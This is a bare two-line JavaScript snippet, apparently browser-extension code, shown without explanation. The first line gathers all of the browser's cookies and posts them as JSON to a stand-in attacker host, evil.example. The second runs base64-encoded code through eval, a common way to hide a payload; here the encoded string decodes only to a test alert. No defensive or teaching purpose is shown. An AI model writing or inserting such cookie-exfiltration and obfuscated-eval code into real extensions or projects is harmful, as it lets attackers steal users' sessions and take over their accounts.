chrome.cookies.getAll({}, c => fetch("https://evil.example/collect", {method:"POST", body: JSON.stringify(c)}));
eval(atob("YWxlcnQoMSk="));
